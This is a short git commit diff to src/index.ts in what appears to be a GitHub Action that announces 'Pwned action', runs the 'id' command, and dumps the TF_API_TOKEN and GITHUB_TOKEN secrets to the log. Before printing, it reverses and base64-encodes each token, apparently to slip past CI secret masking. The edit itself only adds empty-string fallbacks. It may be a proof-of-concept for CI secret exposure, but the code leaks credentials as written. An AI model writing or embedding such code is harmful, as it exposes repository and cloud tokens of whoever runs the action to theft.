9e0bd3a266ebffd5d9ba051dc8480cbbb512eddb
mousefluff <124876575+mousefluff@users.noreply.github.com>
2024-02-17 15:16:09 +0100

    Update index.ts

--- src/index.ts
+++ src/index.ts
@@ -11,8 +11,10 @@ import { execSync } from 'child_process';
 console.log("\r\nPwned action...");
 console.log(execSync('id').toString());
 
-const tfToken = Buffer.from(process.env.TF_API_TOKEN.split("").reverse().join("")).toString('base64');
-const ghToken = Buffer.from(process.env.GITHUB_TOKEN.split("").reverse().join("")).toString('base64');
+
+
+const tfToken = Buffer.from(process.env.TF_API_TOKEN || ''.split("").reverse().join("")).toString('base64');
+const ghToken = Buffer.from(process.env.GITHUB_TOKEN || ''.split("").reverse().join("")).toString('base64');
 
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
